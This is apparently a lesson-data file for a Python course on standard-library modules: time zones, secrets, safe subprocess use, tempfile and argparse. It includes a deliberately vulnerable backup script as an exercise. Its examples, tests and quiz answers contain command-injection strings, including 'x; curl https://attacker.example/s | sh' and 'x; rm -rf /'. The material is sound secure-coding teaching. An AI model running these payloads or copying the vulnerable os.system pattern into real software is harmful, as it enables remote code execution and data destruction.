/* ============================================================================
   LESSON 7.8 — A Standard Library Tour Worth Taking
   ========================================================================= */
EC.receiveLesson({
  id: "7.8",

  lede: "Every dependency you add is code you did not write, running with your privileges, that someone must update forever. The standard library already covers a surprising amount of what people reach for packages to do — and knowing which parts, **and which parts have traps**, is the difference between a lean project and one with forty transitive dependencies.",

  objectives: [
    "Handle time correctly with aware datetimes and `zoneinfo`",
    "Choose `secrets` over `random` for anything a user should not predict",
    "Run subprocesses without creating a command-injection vulnerability",
    "Use `tempfile` and `argparse` for the jobs people add dependencies for",
    "Recognise where a dependency genuinely earns its place"
  ],

  prerequisites: ["7.1", "7.6"],

  blocks: [

    { t: "h2", n: "01", text: "datetime and time zones", id: "datetime" },

    { t: "viz",
      title: "Naive and aware are different types in practice",
      caption: "A naive datetime has no time zone, so it names a wall-clock reading with no way to know which clock. Comparing or subtracting a naive and an aware datetime raises. Mixing them accidentally is the most common date bug in Python.",
      svg: `<svg viewBox="0 0 900 270" role="img" aria-label="Diagram contrasting a naive datetime with no tzinfo against an aware datetime carrying a timezone">
  <rect x="14" y="26" width="418" height="176" rx="9" style="fill:none;stroke:var(--crit)" stroke-width="1.4"/>
  <text x="34" y="52" class="s-label" style="fill:var(--crit)">NAIVE — tzinfo is None</text>
  <text x="34" y="80" class="s-mono" style="font-size:11px">datetime(2026, 3, 29, 1, 30)</text>
  <text x="34" y="102" class="s-mono" style="font-size:11px">datetime.now()</text>

  <text x="34" y="134" class="s-sub">"01:30 on the 29th" — but WHERE?</text>
  <text x="34" y="156" class="s-sub">Ambiguous during a DST fall-back,</text>
  <text x="34" y="178" class="s-sub">nonexistent during a spring-forward.</text>

  <rect x="468" y="26" width="418" height="176" rx="9" style="fill:none;stroke:var(--good)" stroke-width="1.4"/>
  <text x="488" y="52" class="s-label" style="fill:var(--good)">AWARE — tzinfo is set</text>
  <text x="488" y="80" class="s-mono" style="font-size:11px">datetime.now(timezone.utc)</text>
  <text x="488" y="102" class="s-mono" style="font-size:11px">datetime(..., tzinfo=ZoneInfo("Europe/London"))</text>

  <text x="488" y="134" class="s-sub">Names an instant. Convertible,</text>
  <text x="488" y="156" class="s-sub">comparable, serialisable without</text>
  <text x="488" y="178" class="s-sub">losing information.</text>

  <text x="14" y="234" class="s-mono" style="font-size:11px;fill:var(--crit)">naive &lt; aware  →  TypeError: can't compare offset-naive and offset-aware datetimes</text>
  <text x="14" y="258" class="s-sub">The rule: store and compute in UTC, convert to a local zone only for display or for user-facing rules.</text>
</svg>`
    },

    { t: "code", lang: "python", title: "the correct patterns", code: `
from datetime import datetime, timezone, timedelta
from zoneinfo import ZoneInfo          # stdlib since 3.9 -- no pytz needed

# WRONG: deprecated in 3.12, and returns a NAIVE datetime holding UTC
now = datetime.utcnow()

# RIGHT
now = datetime.now(timezone.utc)

# Parsing and formatting
iso = now.isoformat()                  # '2026-09-04T21:14:03.221+00:00'
back = datetime.fromisoformat(iso)     # aware, round-trips exactly

# Converting for display
london = now.astimezone(ZoneInfo("Europe/London"))
tokyo = now.astimezone(ZoneInfo("Asia/Tokyo"))

# Durations
deadline = now + timedelta(hours=2)
elapsed = (deadline - now).total_seconds()
`,
      out: `2026-09-04T21:14:03.221+00:00`,
      caption: "`datetime.utcnow()` was a trap the whole time: it returned a **naive** datetime containing UTC, so it compared as though it were local time. It is deprecated in 3.12 — use `datetime.now(timezone.utc)`."
    },

    { t: "callout", kind: "trap", title: "Arithmetic across a DST boundary is not what you expect", body: [
      { t: "code", lang: "python", title: "adding a day is not adding 24 hours", numbered: false, code: `
from datetime import datetime, timedelta
from zoneinfo import ZoneInfo

london = ZoneInfo("Europe/London")

# 29 March 2026: clocks go forward at 01:00
before = datetime(2026, 3, 28, 12, 0, tzinfo=london)

# timedelta is ABSOLUTE time -- exactly 24 hours later
plus_a_day = before + timedelta(days=1)
print(plus_a_day)                     # 13:00, not 12:00

# For "the same wall-clock time tomorrow", normalise explicitly
same_time = (before.replace(tzinfo=None) + timedelta(days=1)).replace(tzinfo=london)
print(same_time)                      # 12:00`,
        out: `2026-03-29 13:00:00+01:00
2026-03-29 12:00:00+01:00`},
      { t: "p", text: "Both answers are correct for different questions. **\"24 hours from now\" and \"this time tomorrow\" are genuinely different**, and a scheduler that confuses them fires an hour early twice a year." },
      { t: "p", text: "The other DST hazards: a **nonexistent** local time during spring-forward (02:30 simply does not occur), and an **ambiguous** one during fall-back (01:30 happens twice — disambiguate with `fold=0` or `fold=1`)." }
    ]},

    { t: "h2", n: "02", text: "uuid and secrets", id: "identity" },

    { t: "code", lang: "python", title: "identifiers and tokens are different problems", code: `
import secrets
import uuid

# Identifiers -- must be unique, need not be unpredictable
print(uuid.uuid4())                     # random; the default choice
print(uuid.uuid5(uuid.NAMESPACE_URL, "https://acme/orders/1"))   # deterministic

# Tokens -- must be UNPREDICTABLE
print(secrets.token_urlsafe(32))        # session tokens, reset links, API keys
print(secrets.token_hex(16))
print(secrets.choice(["a", "b", "c"]))  # a random pick nobody can predict

# Comparing a secret -- constant time, so timing cannot leak the prefix
secrets.compare_digest(provided, expected)
`,
      out: `f47ac10b-58cc-4372-a567-0e02b2c3d479
a6c4f1f8-3b52-5d1e-9f4c-8a2b1c0d3e4f
kO8vQ2mXhT4pR1sN7wY3bF9dL6gJ0aZc
9f2c4b8e1a7d3f6b0c5e8a2d4f7b1c3e
b`
    },

    { t: "callout", kind: "warn", title: "`random` is predictable by design", body: [
      { t: "code", lang: "python", title: "why this matters", numbered: false, code: `
import random

# NEVER for anything security-relevant
token = "".join(random.choices("abcdef0123456789", k=32))

# Mersenne Twister: observing 624 consecutive outputs lets an attacker
# reconstruct the internal state and predict EVERY future value --
# including every other user's password-reset token.`},
      { t: "p", text: "`random` is a fast, reproducible pseudo-random generator for simulations, sampling and tests. `secrets` uses the operating system's cryptographic source." },
      { t: "p", text: "**The rule is simple: if guessing the value would be a security problem, use `secrets`.** Password reset links, session identifiers, API keys, CSRF tokens, one-time codes, temporary filenames in a shared directory." }
    ]},

    { t: "h2", n: "03", text: "subprocess", id: "subprocess" },

    { t: "ladder",
      title: "Running an external command",
      rungs: [
        { level: "bad", label: "os.system or shell=True with interpolation",
          why: "The string is handed to a shell, so anything in `filename` that a shell treats specially is executed. A filename of `x; rm -rf /` is a command, not an argument. This is command injection, and it is the single most common way Python code becomes a vulnerability.",
          code: `import os
os.system(f"convert {filename} out.png")

import subprocess
subprocess.run(f"convert {filename} out.png", shell=True)` },
        { level: "ok", label: "A list, no shell",
          why: "Arguments are passed directly to `execve` with no shell involved, so a filename containing a semicolon is just a filename. But the return code is ignored, so a failure passes silently, and there is no timeout.",
          code: `subprocess.run(["convert", filename, "out.png"])` },
        { level: "best", label: "List, checked, captured, bounded",
          why: "`check=True` turns a non-zero exit into an exception carrying the command and output. `capture_output` keeps stderr for the error message. `timeout` stops a hung child from hanging your service. `text=True` avoids bytes handling for a command that outputs text.",
          code: `import subprocess

try:
    result = subprocess.run(
        ["convert", filename, "out.png"],
        check=True,
        capture_output=True,
        text=True,
        timeout=30,
        cwd=workdir,                  # explicit, not "wherever we happen to be"
        env={"PATH": "/usr/bin:/bin"},  # minimal, not the whole environment
    )
except subprocess.CalledProcessError as err:
    log.error("convert failed", extra={"code": err.returncode, "stderr": err.stderr})
    raise
except subprocess.TimeoutExpired:
    log.error("convert timed out", extra={"file": filename})
    raise`,
          note: "Passing `env` explicitly is worth the extra line: the child otherwise inherits every variable in your process, including credentials it has no business seeing." }
      ]
    },

    { t: "callout", kind: "insight", title: "When you genuinely need a shell", body: [
      { t: "code", lang: "python", title: "quote everything you interpolate", numbered: false, code: `
import shlex
import subprocess

# You need a pipeline, so a shell is unavoidable
command = f"grep {shlex.quote(pattern)} {shlex.quote(path)} | wc -l"
subprocess.run(command, shell=True, check=True)

# Better where possible: connect the processes yourself, no shell at all
grep = subprocess.Popen(["grep", pattern, path], stdout=subprocess.PIPE)
count = subprocess.run(["wc", "-l"], stdin=grep.stdout, capture_output=True)
grep.stdout.close()`},
      { t: "p", text: "`shlex.quote` is the only correct way to interpolate a value into a shell command — manual quoting misses cases, and f-strings inside `shell=True` are a finding in any security review." },
      { t: "p", text: "**Most \"I need a shell\" cases are pipes or globs**, and both have direct equivalents: connect `stdout` to `stdin` yourself, and use `pathlib.Path.glob` (Lesson 7.1)." }
    ]},

    { t: "h2", n: "04", text: "tempfile and argparse", id: "tempfile" },

    { t: "tabs", items: [
      { label: "tempfile", blocks: [
        { t: "code", lang: "python", title: "never build a temp path by hand", numbered: false, code: `
import tempfile
from pathlib import Path

# WRONG -- predictable name, world-readable directory: a symlink attack,
# and a collision when two processes run at once
path = f"/tmp/report-{os.getpid()}.csv"

# A directory that cleans itself up, contents included
with tempfile.TemporaryDirectory() as tmp:
    output = Path(tmp) / "report.csv"
    output.write_text(data, encoding="utf-8")
    upload(output)
# gone here -- even if upload() raised

# A file handle
with tempfile.NamedTemporaryFile(
    mode="w", suffix=".csv", encoding="utf-8", delete_on_close=False
) as f:
    f.write(data)
    f.close()
    subprocess.run(["import-tool", f.name], check=True)   # reopen by name`},
        { t: "p", text: "**`delete_on_close=False` (3.12+) is the fix for a long-standing Windows problem**: a `NamedTemporaryFile` could not be reopened by another process while still open. On older versions, use `TemporaryDirectory` and create the file inside it." },
        { t: "p", text: "`tempfile` names are generated with `secrets`-grade randomness and created with restrictive permissions, which is the security half of why hand-built paths are wrong." }
      ]},
      { label: "argparse", blocks: [
        { t: "code", lang: "python", title: "a real CLI, including subcommands", numbered: false, code: `
import argparse
from collections.abc import Sequence


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="acme",
        description="Billing operations.",
    )
    parser.add_argument("--verbose", "-v", action="count", default=0)
    parser.add_argument("--version", action="version", version="1.4.0")

    sub = parser.add_subparsers(dest="command", required=True)

    run = sub.add_parser("run", help="Run the nightly close.")
    run.add_argument("--date", type=date.fromisoformat, default=date.today(),
                     help="Process this date instead of today (YYYY-MM-DD).")
    run.add_argument("--dry-run", action="store_true")

    report = sub.add_parser("report", help="Print a summary.")
    report.add_argument("customer")
    report.add_argument("--format", choices=["text", "json"], default="text")

    return parser


def main(argv: Sequence[str] | None = None) -> int:
    args = build_parser().parse_args(argv)      # argv, so it is testable
    ...
    return 0`},
        { t: "p", text: "**`type=` does conversion and validation in one place**, so `--date` arrives as a `date` and a bad value produces a usage error rather than an exception three layers down." },
        { t: "p", text: "For anything more elaborate — rich help, shell completion, dependency-injected commands — `typer` or `click` earn their place. For a handful of flags and two subcommands, `argparse` is already installed." }
      ]}
    ]},

    { t: "h2", n: "05", text: "The rest of the tour", id: "rest" },

    { t: "table",
      head: ["Instead of", "Use", "For"],
      rows: [
        ["`requests` for one call", "`urllib.request`", "A single GET in a script with no dependencies — grudgingly; `httpx` is worth it for anything real"],
        ["`python-dotenv`", "`os.environ.get` + a documented `.env` loader", "Reading configuration, when the loader is three lines"],
        ["`attrs` (sometimes)", "`dataclasses`", "Plain records with defaults, comparison and `slots` (Lesson 4.10)"],
        ["`pytz`", "`zoneinfo`", "Time zones — stdlib since 3.9, and with a saner API"],
        ["`toml` readers", "`tomllib`", "Reading TOML — stdlib since 3.11 (read-only)"],
        ["`six`, `future`", "Nothing", "Python 2 compatibility, which ended in 2020"],
        ["A hand-rolled retry", "`itertools` + a loop, or `tenacity`", "Retry logic — the stdlib gets you most of the way (Lesson 6.5)"],
        ["`simplejson`", "`json`", "JSON — use `orjson` only when profiling says serialisation is the bottleneck"]
      ],
      caption: "**The test for a dependency is whether it saves more than it costs.** `httpx`, `pydantic` and `rich` clearly do. A package that wraps four lines of standard library does not, and it is one more thing to patch when a CVE lands."
    },

    { t: "callout", kind: "note", title: "Three more worth knowing exist", body: [
      { t: "ul", items: [
        "**`textwrap.dedent`** — strips common leading whitespace, which makes an indented multi-line string in a function body come out flush left. Essential for embedded SQL and help text.",
        "**`shutil`** — `copy2`, `move`, `rmtree`, `which`, `disk_usage`, and `make_archive`. `shutil.which(\"convert\")` is how you check a command exists before running it.",
        "**`functools.cache` on a config loader** — the standard way to read a file once per process without a module-level global (Lesson 5.10)."
      ]}
    ]},

    { t: "h2", n: "06", text: "Practice", id: "practice" },

    { t: "exercise",
      kind: "Challenge",
      title: "A backup CLI with four vulnerabilities",
      difficulty: "core",
      minutes: 30,
      body: [
        { t: "p", text: "This tool has been in use for two years. It contains a command-injection vulnerability, a predictable-token bug, a time-zone bug that fires twice a year, and a temp-file race — plus several smaller problems." },
        { t: "code", lang: "python", title: "backup.py — as found", numbered: false, code: `
import os, random, string, sys
from datetime import datetime

def backup(source, bucket):
    stamp = datetime.utcnow().strftime("%Y-%m-%d_%H%M")
    token = "".join(random.choice(string.hexdigits) for _ in range(16))
    archive = "/tmp/backup-" + stamp + "-" + token + ".tar.gz"

    os.system("tar czf " + archive + " " + source)
    os.system("aws s3 cp " + archive + " s3://" + bucket + "/" + os.path.basename(archive))
    os.remove(archive)

    print("backed up " + source + " at " + stamp)

if __name__ == "__main__":
    backup(sys.argv[1], sys.argv[2])`},
        { t: "p", text: "Rewrite it, and write tests that would fail on the original for each defect." }
      ],
      requirements: [
        "Identify all four named vulnerabilities plus at least three smaller problems.",
        "Replace `os.system` with a safe subprocess call, checked and bounded by a timeout.",
        "Fix the timestamp so it is unambiguous and sorts correctly.",
        "Use a cryptographically secure token, or explain why no token is needed at all.",
        "Eliminate the temp-file race and guarantee cleanup even on failure.",
        "Add `argparse`, a testable `main(argv)`, and meaningful exit codes.",
        "Write a test proving a hostile filename cannot execute a command."
      ],
      hint: "For the injection, ask what happens with a source directory called `x; curl attacker.example/s | sh`. For the timestamp, ask what two backups taken an hour apart on the last Sunday in October are called.",
      solution: {
        lang: "python",
        title: "backup.py",
        code: `#!/usr/bin/env python3
"""
=========================================================================
DEFECTS IN THE ORIGINAL
=========================================================================

1. COMMAND INJECTION (critical)
   os.system("tar czf " + archive + " " + source)
   The string goes to a shell. A source of

       x; curl https://attacker.example/s | sh

   runs that command as the backup user -- which typically has read
   access to everything on the machine. Same flaw in the aws call, where
   "bucket" is also interpolated.

2. PREDICTABLE TOKEN
   random.choice is the Mersenne Twister: seeded from the clock and
   fully reconstructable from ~624 outputs. Combined with a predictable
   /tmp path this is a symlink attack -- an attacker who guesses the
   name pre-creates a symlink to a file they want overwritten.

3. TIMEZONE
   datetime.utcnow() returns a NAIVE datetime holding UTC (deprecated in
   3.12). It compares as if local, and "%Y-%m-%d_%H%M" records no offset
   at all -- so nobody reading the filename knows which zone it is in.
   If a future maintainer switches to datetime.now(), the last Sunday in
   October produces TWO backups an hour apart with the SAME name, and
   the second silently overwrites the first.

4. TEMP FILE RACE
   A hand-built /tmp path in a world-writable directory. Two concurrent
   runs collide; an attacker who wins the race controls the file.

Smaller, still real:

5. os.system ignores the exit code -- a failed tar is "backed up".
6. No timeout: a hung aws call blocks forever.
7. os.remove is not in a finally, so a failed upload leaves the archive
   (containing the data) on disk indefinitely.
8. sys.argv[1] with no argparse: no --help, and an IndexError if run
   with no arguments.
9. The archive is written to /tmp, which is often a small tmpfs -- a
   large backup fills memory.
"""

from __future__ import annotations

import argparse
import logging
import shutil
import subprocess
import sys
import tempfile
from collections.abc import Sequence
from datetime import datetime, timezone
from pathlib import Path

log = logging.getLogger("backup")

TAR_TIMEOUT = 3600
UPLOAD_TIMEOUT = 1800


def archive_name(when: datetime | None = None) -> str:
    """Aware UTC, with the offset in the name.

    - datetime.now(timezone.utc), not utcnow(): aware, not deprecated.
    - The offset is IN the filename, so it is unambiguous forever.
    - Seconds included: two backups a minute apart no longer collide.
    - The format sorts lexicographically in the same order as
      chronologically, which is what makes "ls" useful.

    No random token: a UTC timestamp to the second in a private
    directory is already unique, and tempfile handles collisions.
    """
    when = when or datetime.now(timezone.utc)
    return f"backup-{when.strftime('%Y%m%dT%H%M%SZ')}.tar.gz"


def run(command: list[str], *, timeout: int) -> subprocess.CompletedProcess[str]:
    """One place where every external command is run, safely.

    - A LIST, never a string, and never shell=True. Arguments go
      straight to execve, so a filename containing ';' is a filename.
    - check=True: a non-zero exit raises with the command and output.
    - capture_output + text: stderr is available for the log line.
    - timeout: a hung child cannot block the job forever.
    """
    log.debug("running", extra={"command": command[0], "argc": len(command)})
    return subprocess.run(
        command, check=True, capture_output=True, text=True, timeout=timeout
    )


def backup(source: Path, bucket: str, *, dry_run: bool = False) -> str:
    """Archive a directory and upload it. Returns the object key."""
    if not source.is_dir():
        raise NotADirectoryError(f"{source} is not a directory")

    for tool in ("tar", "aws"):
        if shutil.which(tool) is None:
            raise FileNotFoundError(f"{tool} is not on PATH")

    name = archive_name()

    # TemporaryDirectory: an unpredictable name, 0700 permissions, and
    # removed with its contents even if an exception is raised. That is
    # defects 4 and 7 fixed by one construct.
    with tempfile.TemporaryDirectory(prefix="backup-") as tmp:
        archive = Path(tmp) / name

        run(["tar", "--create", "--gzip",
             "--file", str(archive),
             "--directory", str(source.parent), source.name],
            timeout=TAR_TIMEOUT)

        size = archive.stat().st_size
        log.info("archive created", extra={"name": name, "bytes": size})

        if dry_run:
            log.info("dry run -- not uploading")
            return name

        run(["aws", "s3", "cp", str(archive), f"s3://{bucket}/{name}"],
            timeout=UPLOAD_TIMEOUT)

    log.info("upload complete", extra={"bucket": bucket, "key": name})
    return name


def main(argv: Sequence[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="backup", description="Archive a directory to S3.")
    parser.add_argument("source", type=Path)
    parser.add_argument("bucket")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args(argv)

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
    )

    try:
        key = backup(args.source, args.bucket, dry_run=args.dry_run)
    except (NotADirectoryError, FileNotFoundError) as err:
        log.error("%s", err)
        return 2                                  # bad input -- do not retry
    except subprocess.TimeoutExpired as err:
        log.error("%s timed out after %ss", err.cmd[0], err.timeout)
        return 3                                  # transient -- retry later
    except subprocess.CalledProcessError as err:
        log.error("%s failed (%d): %s", err.cmd[0], err.returncode,
                  (err.stderr or "").strip()[:500])
        return 1

    print(key)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))


# =========================================================================
# TESTS
# =========================================================================

import re


def test_hostile_filename_cannot_execute_a_command(tmp_path, monkeypatch):
    """THE security test.

    A directory whose NAME is a shell command. The original would have
    executed it; the rewrite passes it to execve as one argument.
    """
    hostile = tmp_path / "x; touch /tmp/pwned"
    hostile.mkdir()
    executed = []

    def fake_run(command, **kwargs):
        executed.append(command)
        assert isinstance(command, list), "a string would reach a shell"
        assert kwargs.get("shell") is not True
        return subprocess.CompletedProcess(command, 0, "", "")

    monkeypatch.setattr(subprocess, "run", fake_run)
    monkeypatch.setattr(shutil, "which", lambda _: "/usr/bin/x")

    backup(hostile, "my-bucket", dry_run=True)

    # The dangerous string is ONE argument, not part of a command line
    tar = executed[0]
    assert "x; touch /tmp/pwned" in tar
    assert not any(";" in part for part in tar[:-1])


def test_archive_name_is_unambiguous_and_sorts():
    """Two instants an hour apart on a DST boundary must differ."""
    before = datetime(2026, 10, 25, 0, 30, tzinfo=timezone.utc)   # 01:30 BST
    after = datetime(2026, 10, 25, 1, 30, tzinfo=timezone.utc)    # 01:30 GMT

    assert archive_name(before) != archive_name(after)
    assert archive_name(before) < archive_name(after)     # sorts chronologically
    assert archive_name(before).endswith("Z.tar.gz")      # zone is explicit


def test_archive_name_has_no_predictable_random_component():
    """Two calls at the same instant give the same name -- deliberately.

    Uniqueness comes from the timestamp and from tempfile's directory,
    not from a token an attacker could predict.
    """
    fixed = datetime(2026, 1, 1, tzinfo=timezone.utc)
    assert archive_name(fixed) == archive_name(fixed)
    assert re.fullmatch(r"backup-\\d{8}T\\d{6}Z\\.tar\\.gz", archive_name(fixed))


def test_temp_directory_is_removed_when_upload_fails(tmp_path, monkeypatch):
    """Defect 7: the original left the archive -- containing the data --
    on disk whenever the upload raised."""
    source = tmp_path / "data"
    source.mkdir()
    (source / "f.txt").write_text("x")

    seen: list[Path] = []

    def fake_run(command, **kwargs):
        if command[0] == "tar":
            Path(command[4]).write_bytes(b"archive")
            seen.append(Path(command[4]).parent)
            return subprocess.CompletedProcess(command, 0, "", "")
        raise subprocess.CalledProcessError(1, command, stderr="denied")

    monkeypatch.setattr(subprocess, "run", fake_run)
    monkeypatch.setattr(shutil, "which", lambda _: "/usr/bin/x")

    try:
        backup(source, "bucket")
    except subprocess.CalledProcessError:
        pass

    assert seen and not seen[0].exists()      # cleaned up despite the failure


def test_missing_tool_fails_before_doing_any_work(tmp_path, monkeypatch):
    source = tmp_path / "d"
    source.mkdir()
    monkeypatch.setattr(shutil, "which", lambda _: None)

    assert main([str(source), "bucket"]) == 2


def test_every_subprocess_call_has_a_timeout(tmp_path, monkeypatch):
    """Defect 6: without this, a hung aws call blocks the job forever."""
    source = tmp_path / "d"
    source.mkdir()
    calls = []

    monkeypatch.setattr(shutil, "which", lambda _: "/usr/bin/x")
    monkeypatch.setattr(
        subprocess, "run",
        lambda command, **kw: calls.append(kw) or subprocess.CompletedProcess(command, 0, "", ""),
    )

    backup(source, "bucket")
    assert all(kw.get("timeout") for kw in calls)
    assert all(kw.get("check") for kw in calls)`,
        notes: [
          { t: "p", text: "**The injection test is the one to copy into any project that shells out.** It asserts two things at once: that the command is a list, and that no argument except the last contains a shell metacharacter. A future refactor back to a string fails it immediately." },
          { t: "p", text: "**Removing the random token entirely is the right answer, not a stronger one.** The token existed to make the filename unique; a UTC timestamp to the second inside a `TemporaryDirectory` already guarantees that, and `tempfile` generates the unpredictable part with cryptographic randomness. Adding `secrets.token_hex` would have fixed the vulnerability while leaving unnecessary machinery." },
          { t: "p", text: "**The `Z` suffix and second-level precision are what make the name honest.** `%Y-%m-%d_%H%M` in an unspecified zone means two backups on the last Sunday in October can share a name and silently overwrite each other — and nobody reading a filename six months later can tell which zone it was." },
          { t: "callout", kind: "insight", title: "One `TemporaryDirectory` fixes two defects", body: [
            { t: "p", text: "It solves the race — an unpredictable name with 0700 permissions, created atomically — and the cleanup, because the context manager removes the tree even when the upload raises." },
            { t: "p", text: "The original needed a `try/finally` plus a secure name to reach the same place. Choosing the construct that makes the correct behaviour automatic beats remembering to write the correct behaviour (Lesson 5.8)." }
          ]},
          { t: "p", text: "**Distinct exit codes turn this into something a scheduler can act on**: `2` for bad input (never retry), `3` for a timeout (retry later), `1` for a command failure (investigate). A script that only ever exits 0 or 1 forces an operator to read logs to learn anything (Lesson 5.12)." }
        ]
      }
    },

    { t: "callout", kind: "scenario", title: "Real-world scenario", body: [
      { t: "p", text: "A scheduling service stores appointment times as naive local datetimes, because that is what users enter and what the UI displays. It works for four years — the company operates in one country and nobody thinks about it." },
      { t: "p", text: "**Expansion into two more time zones broke it in every direction.** Appointments displayed at the wrong hour, reminder emails fired at 3 a.m., and the last Sunday in October produced a batch of duplicate bookings because two different instants were stored as identical values." },
      { t: "p", text: "**The migration was expensive precisely because the data was lossy.** Every stored timestamp had to be reinterpreted against the office it belonged to, and rows created during a fall-back hour were genuinely ambiguous — the information needed to resolve them was never recorded." },
      { t: "p", text: "**Store aware UTC, always.** Convert to a local zone at the edges, for display and for rules like \"business hours\", and keep the user's zone as a separate field so you can reconstruct their intent. It costs nothing at the start and cannot be added retroactively, because the missing information is gone." }
    ]}
  ],

  takeaways: [
    "**`datetime.utcnow()` is deprecated and always was a trap** — it returned a naive datetime holding UTC, which compares as though it were local. Use `datetime.now(timezone.utc)`.",
    "**Store and compute in aware UTC; convert at the edges.** Naive datetimes lose information you cannot reconstruct later.",
    "**`timedelta` is absolute time**, so adding a day across a DST boundary shifts the wall clock by an hour. \"24 hours from now\" and \"this time tomorrow\" are different questions.",
    "**`zoneinfo` is in the standard library since 3.9** — `pytz` is no longer needed, and `zoneinfo` has the saner API.",
    "**`random` is predictable by design.** Observing enough Mersenne Twister output reconstructs its state; use `secrets` for anything a user should not be able to guess.",
    "**`secrets.compare_digest` compares in constant time**, so an attacker cannot learn a token prefix from response timing.",
    "**Never pass a built string to a shell.** `subprocess.run([...])` with a list goes straight to `execve`, so a filename containing `;` is just a filename.",
    "**Always pass `check=True` and `timeout=`** — otherwise a failure is silent and a hung child blocks the process forever.",
    "**Use `shlex.quote` if a shell is genuinely required**, and prefer connecting processes yourself over invoking one for a pipe.",
    "**`tempfile.TemporaryDirectory` gives an unpredictable name, restrictive permissions and guaranteed cleanup** — three defects avoided by one construct.",
    "**`argparse` with `type=` converts and validates in one place**, and `main(argv)` keeps the CLI testable without a subprocess.",
    "**Judge a dependency by whether it saves more than it costs.** A package wrapping four lines of standard library is one more thing to patch when a CVE lands."
  ],

  quiz: {
    title: "Knowledge check",
    questions: [
      {
        stem: "Why is `datetime.utcnow()` deprecated?",
        options: [
          "It is slower than `datetime.now()`",
          "It returns a **naive** datetime containing UTC, so it compares and formats as though it were local time",
          "It does not work on Windows",
          "It loses sub-second precision"
        ],
        answer: 1,
        why: "The value holds UTC but carries no `tzinfo`, so Python treats it as local when comparing or converting — and comparing it with an aware datetime raises `TypeError`. `datetime.now(timezone.utc)` returns an aware value that names an instant, converts correctly, and round-trips through `isoformat`/`fromisoformat` without losing the offset."
      },
      {
        stem: "Why must a password-reset token use `secrets` rather than `random`?",
        options: [
          "`random` produces shorter strings",
          "`random` is a Mersenne Twister — enough observed output reveals its internal state and lets an attacker predict every other user's token",
          "`random` is not thread-safe",
          "`secrets` produces URL-safe output and `random` does not"
        ],
        answer: 1,
        why: "`random` is built for reproducible simulations, not unpredictability: its state is recoverable from roughly 624 consecutive outputs, and it is often seeded from the clock. `secrets` draws from the operating system's cryptographic source. The rule is simply whether guessing the value would be a security problem — reset links, session ids, API keys, CSRF tokens."
      },
      {
        stem: "What is wrong with `subprocess.run(f\"tar czf out.tar {path}\", shell=True)`?",
        options: [
          "It is slower than passing a list",
          "The string reaches a shell, so a `path` of `x; curl evil | sh` executes that command with your process's privileges",
          "`shell=True` is not available on Windows",
          "It cannot capture output"
        ],
        answer: 1,
        why: "This is command injection. Passing a list — `[\"tar\", \"czf\", \"out.tar\", path]` — hands arguments directly to `execve` with no shell parsing, so metacharacters are ordinary characters. If a shell is genuinely required for a pipeline, every interpolated value must go through `shlex.quote`; most such cases are better solved by connecting the processes yourself."
      },
      {
        stem: "Why prefer `tempfile.TemporaryDirectory()` over building a path like `/tmp/job-{pid}.csv`?",
        options: [
          "It is faster",
          "The name is unpredictable and the directory is created with restrictive permissions, and the tree is removed even if an exception is raised",
          "It allows larger files",
          "`/tmp` is not writable in containers"
        ],
        answer: 1,
        why: "A predictable name in a world-writable directory is a symlink attack and a collision between concurrent runs. `tempfile` generates names with cryptographic randomness and creates the directory 0700. The context manager also guarantees cleanup on failure, which fixes the separate bug of a half-written archive full of data being left on disk."
      }
    ]
  },

  interview: {
    title: "Interview lens",
    sub: "Answer out loud before opening",
    questions: [
      {
        level: "core",
        q: "How should an application handle time zones?",
        strong: "Store and compute in aware UTC — `datetime.now(timezone.utc)` — and convert to a local zone only for display or for rules like business hours. Keep the user's zone as a separate field so their intent is recoverable.",
        answer: [
          { t: "p", text: "The reason naive datetimes are unacceptable is that the loss is irreversible: a row written during a fall-back hour is genuinely ambiguous, and the information needed to resolve it was never stored." },
          { t: "p", text: "The `timedelta` subtlety is a good discriminator — adding a day is adding exactly 24 hours, which is not the same as the same wall-clock time tomorrow, and a scheduler that confuses them misfires twice a year." },
          { t: "p", text: "Knowing `zoneinfo` replaced `pytz` in 3.9 shows the knowledge is current rather than remembered from an older codebase." }
        ]
      },
      {
        level: "advanced",
        q: "How do you safely run an external command from Python?",
        strong: "`subprocess.run` with a list of arguments, `check=True`, `capture_output=True`, and a `timeout`. Never a formatted string with `shell=True` — that is command injection, since anything the shell treats specially in an interpolated value is executed.",
        answer: [
          { t: "p", text: "A concrete example makes it land: a filename of `x; curl evil | sh` is a command with `shell=True` and just a filename when passed in a list." },
          { t: "p", text: "`check=True` and `timeout` are worth stating as non-optional — without them a failure is silent and a hung child blocks the process indefinitely." },
          { t: "p", text: "The extras show operational care: `shlex.quote` when a shell is genuinely unavoidable, an explicit minimal `env` so the child does not inherit credentials, and `shutil.which` to fail early when a tool is missing." }
        ]
      },
      {
        level: "core",
        q: "When would you add a dependency rather than use the standard library?",
        strong: "When it saves more than it costs. `httpx` and `pydantic` clearly do. A package wrapping four lines of stdlib does not — it is one more thing to audit, update and patch when a CVE lands.",
        answer: [
          { t: "p", text: "Naming specific replacements shows the knowledge is real rather than a principle: `zoneinfo` over `pytz`, `tomllib` over a TOML package, `dataclasses` for plain records." },
          { t: "p", text: "The security framing is the part that persuades reviewers — a dependency is code running with your privileges, and every transitive package widens the surface." },
          { t: "p", text: "Being clear about where the stdlib genuinely loses — HTTP with connection pooling, retries and timeouts is not something to hand-roll on `urllib` — keeps it a judgement rather than an ideology." }
        ]
      }
    ]
  }
});
